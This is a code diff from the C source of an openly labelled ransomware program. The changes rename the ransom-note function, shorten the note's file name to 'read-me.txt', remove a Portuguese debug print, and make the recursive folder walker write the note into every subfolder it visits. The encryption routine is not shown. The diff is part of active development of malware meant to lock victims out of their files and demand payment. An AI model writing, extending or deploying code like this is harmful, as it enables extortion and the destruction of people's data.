@@ -25,9 +25,9 @@ setLocaleUTF8ToAvoidChineseCharErrors() {
 	_wsetlocale(LC_ALL, L".UTF8");
 }
 
-createFile(char path[]) {
+createReadmeFile(char path[]) {
 	char fullPath[260];
-	char fileName[] = "/What happened with your files.txt";
+	char fileName[] = "/read-me.txt";
 	strcpy(fullPath, path);
 	strcat(fullPath, fileName);
 
@@ -37,7 +37,6 @@ createFile(char path[]) {
 	fputs("Your files were encrypted by a ransomware", file);
 
 	fclose(file);
-	printf("arquivo criado: %s\n", fullPath);
 }
 
 iterateFolder(char initialPath[]) {
@@ -76,6 +75,7 @@ iterateFolder(char initialPath[]) {
 				char* convertedFolder = convertWCharToChar(fdata.cFileName);
 				strcat(subFolder, convertedFolder);
 				iterateFolder(subFolder);
+				createReadmeFile(subFolder);
 
 			}
 			else {
